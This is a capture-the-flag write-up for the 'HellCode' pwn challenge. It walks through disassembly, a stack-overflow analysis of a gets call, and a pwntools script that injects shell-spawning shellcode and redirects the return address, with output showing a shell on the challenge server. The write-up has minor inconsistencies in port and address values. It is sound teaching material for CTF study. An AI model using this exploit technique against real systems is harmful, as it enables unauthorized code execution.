# HellCode

> Pwn | 200 points
--------------------------

## Problem Statement
 > Getting to the shell?? What the hellcd ..#!/bin/bash  
 > nc 13.233.99.37 1007  
 > [File](./chall)


## Analysis
* The disassembly of this program looks something like 

    > ```gdb
    > gdb$ disass main
    > Dump of assembler code for function main:
    >    0x0000000000401152 <+0>:	push   rbp
    >    0x0000000000401153 <+1>:	mov    rbp,rsp
    >    0x0000000000401156 <+4>:	sub    rsp,0x20
    >    0x000000000040115a <+8>:	mov    rax,QWORD PTR [rip+0x2eff]        # 0x404060 <stdin@@GLIBC_2.2.5>
    >    0x0000000000401161 <+15>:	mov    ecx,0x0
    >    0x0000000000401166 <+20>:	mov    edx,0x2
    >    0x000000000040116b <+25>:	mov    esi,0x0
    >    0x0000000000401170 <+30>:	mov    rdi,rax
    >    0x0000000000401173 <+33>:	call   0x401050 <setvbuf@plt>
    >    0x0000000000401178 <+38>:	mov    rax,QWORD PTR [rip+0x2ed1]        # 0x404050 <stdout@@GLIBC_2.2.5>
    >    0x000000000040117f <+45>:	mov    ecx,0x0
    >    0x0000000000401184 <+50>:	mov    edx,0x2
    >    0x0000000000401189 <+55>:	mov    esi,0x0
    >    0x000000000040118e <+60>:	mov    rdi,rax
    >    0x0000000000401191 <+63>:	call   0x401050 <setvbuf@plt>
    >    0x0000000000401196 <+68>:	lea    rdi,[rip+0xe67]        # 0x402004
    >    0x000000000040119d <+75>:	call   0x401030 <puts@plt>
    >    0x00000000004011a2 <+80>:	lea    rdi,[rip+0xe6e]        # 0x402017
    >    0x00000000004011a9 <+87>:	call   0x401030 <puts@plt>
    >    0x00000000004011ae <+92>:	lea    rdi,[rip+0x2ebb]        # 0x404070 <buf>
    >    0x00000000004011b5 <+99>:	mov    eax,0x0
    >    0x00000000004011ba <+104>:	call   0x401040 <gets@plt>
    >    0x00000000004011bf <+109>:	lea    rax,[rip+0x2eaa]        # 0x404070 <buf>
    >    0x00000000004011c6 <+116>:	and    rax,0xfffffffffffff000
    >    0x00000000004011cc <+122>:	mov    edx,0x7
    >    0x00000000004011d1 <+127>:	mov    esi,0x3e8
    >    0x00000000004011d6 <+132>:	mov    rdi,rax
    >    0x00000000004011d9 <+135>:	call   0x401060 <mprotect@plt>
    >    0x00000000004011de <+140>:	lea    rdi,[rip+0xe4d]        # 0x402032
    >    0x00000000004011e5 <+147>:	call   0x401030 <puts@plt>
    >    0x00000000004011ea <+152>:	lea    rax,[rbp-0x20]
    >    0x00000000004011ee <+156>:	mov    rdi,rax
    >    0x00000000004011f1 <+159>:	mov    eax,0x0
    >    0x00000000004011f6 <+164>:	call   0x401040 <gets@plt>
    >    0x00000000004011fb <+169>:	mov    eax,0x0
    >    0x0000000000401200 <+174>:	leave  
    >    0x0000000000401201 <+175>:	ret    
    > End of assembler dump.
    > gdb$ 
    > ```

* Let's run the program
    > ```shell
    > $ ./chall 
    > Hello There folks!
    > Gimme your shellcode here!
    > someshellcode
    > What's your name though?
    > somename
    > ```

* On running the program it ask for shellcode 
    > ```gdb
    >    0x00000000004011ae <+92>:	lea    rdi,[rip+0x2ebb]        # 0x404070 <buf>
    >    0x00000000004011b5 <+99>:	mov    eax,0x0
    >    0x00000000004011ba <+104>:	call   0x401040 <gets@plt>
    > ```
    > I think it copies the shellcode to **[rip-0x2ebb]**

* The program also asks for our name   
    > ```gdb
    >    0x00000000004011ea <+152>:	lea    rax,[rbp-0x20]
    >    0x00000000004011ee <+156>:	mov    rdi,rax
    >    0x00000000004011f1 <+159>:	mov    eax,0x0
    >    0x00000000004011f6 <+164>:	call   0x401040 <gets@plt>
    > ```
    > We can exploit the above gets call and overwrite the return address so 
    >that it points to our shellcodde


## Solution

* First Let's findout the addres **[rip+0x2ebb]** points to
    > ```gdb
    > gdb$ break *0x00000000004011ae
    > gdb$ ni  
    > gdb$ x/x $rip+0x2ebb
    > 0x404070:	0x00000000
    > ```
    > We get the address where our shellcode will be written it is **0x404069**
    > because we are working with a 64 bit binary we will take the address as
    > **0x0000000000404070**

* Now we need to overwrite the return address 
    > ```
    > Stack map
    > [rbp-0x20]    [ -- -- -- -- ]   <-----Gets will start wriring from here
    > [rbp-0x1c]    [ -- -- -- -- ]
    > [rbp-0x18]    [ -- -- -- -- ]
    > [rbp-0x14]    [ -- -- -- -- ]
    > [rbp-0x10]    [ -- -- -- -- ]
    > [rbp-0xc ]    [ -- -- -- -- ]
    > [rbp-0x8 ]    [ -- -- -- -- ]
    > [rbp-0x4 ]    [ -- -- -- -- ]
    > [   bp   ]    [ -- -- -- -- ]
    > [        ]    [ -- -- -- -- ]
    > [   ret  ]    [ -- -- -- -- ]
    > [        ]    [ -- -- -- -- ]
    > ```

    > First 32 characters will fill up the buffer next 8 characters will overwrite the 
    previous base pointer address and then another 8 characters will overwrite 
    the return address

* Our target is to fill the stack so that it looks like

    > ```
    > Stack map
    > [rbp-0x20]    [ 41 41 41 41 ]   <-----Gets will start wriring from here
    > [rbp-0x1c]    [ 41 41 41 41 ]
    > [rbp-0x18]    [ 41 41 41 41 ]
    > [rbp-0x14]    [ 41 41 41 41 ]
    > [rbp-0x10]    [ 41 41 41 41 ]
    > [rbp-0xc ]    [ 41 41 41 41 ]
    > [rbp-0x8 ]    [ 41 41 41 41 ]
    > [rbp-0x4 ]    [ 41 41 41 41 ]
    > [   bp   ]    [ 42 42 42 42 ]
    > [        ]    [ 42 42 42 42 ]
    > [   ret  ]    [ 00 00 00 00 ]
    > [        ]    [ 70 40 40 00 ]
    > ```
    > Yes that last value  is intensionally flipped because of the litile 
    >endianess

## Exploit
* [**get2_flag.py**](./get_flag2.py)
  >  ```python
  >  import pwn
  >  import sys
  >  pwn.context.arch = 'amd64'
  >  shell = pwn.asm(pwn.shellcraft.linux.sh()) + '\n'
  >  ret = '\x00\x00\x00\x00\x00\x40\x40\x70' [::-1]
  >  init = 'A' * 32 + 'B' * 8 + ret+'\n'
  >  payload = shell + init
  >  print(payload)
  >  ```
  > The above script is in python2 if you need python3 implementation check 
  > [get_flag.py](./get_flag.py)  
  > originally i solved it in python3  
  > run [get_flag.sh](./get_flag.sh) to get the flag instantly


* On local machine
    > ```shell
    >  $ ( python get_flag2.py;cat)|./chall
    > ```
* On Shellserver

    > ```shell
    >$ (python get_flag2.py;cat) | nc 13.233.99.37 1009
    > Hello There folks!
    > Gimme your shellcode here!
    > What's your name though?
    > ls
    > chall
    > flag
    > run.sh
    > cat flag
    > inctf{0n3_H3ll_0f_4_c0d3!}
    > exit
    > ```


## Flag 
`inctf{0n3_H3ll_0f_4_c0d3!}
`

